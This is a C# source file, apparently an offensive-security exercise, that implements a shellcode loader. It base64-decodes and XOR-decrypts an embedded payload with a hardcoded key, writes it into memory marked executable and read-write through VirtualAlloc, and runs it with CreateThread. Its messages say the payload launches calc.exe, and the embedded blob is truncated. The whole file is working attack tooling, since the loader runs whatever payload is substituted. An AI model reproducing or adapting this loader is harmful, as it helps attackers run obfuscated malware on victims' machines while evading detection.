using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

public class SelfDecode
{
    //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
    [DllImport("kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds); 


    private static uint MEM_COMMIT = 0x1000;
    private static uint PAGE_EXECUTE_READWRITE = 0x40;


    private static byte[] xor(byte[] shell, byte[] KeyBytes)
    {
        for (int i = 0; i < shell.Length; i++)
        {
            shell[i] ^= KeyBytes[i % KeyBytes.Length];
        }

        return shell;

    }


    public static void Main()
    {


   
        string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
        byte[] data = Convert.FromBase64String(dataBS64);

        string key = "Trevor2023";
        //Convert Key into bytes
        byte[] keyBytes = Encoding.ASCII.GetBytes(key);

        byte[] encoded = xor(data, keyBytes);


        Console.WriteLine("[+] Allocate memory in the current process");
        // Allocation of memory the size of the shellcode with COMMIT_RESERVE and EXECUTEREADWRITE permissions
        int size = encoded.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Console.WriteLine("[+] Copying shellcode into allocated memory space");
        // Write shellcode into allocated memory space
        Marshal.Copy(encoded, 0, addr, size);

        Console.WriteLine("[+] Creating thread and running...popping calc.exe");
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        // 0xFFFFFFFF = WAIT_FAILED
        WaitForSingleObject(hThread, 0xFFFFFFFF);


    }


}
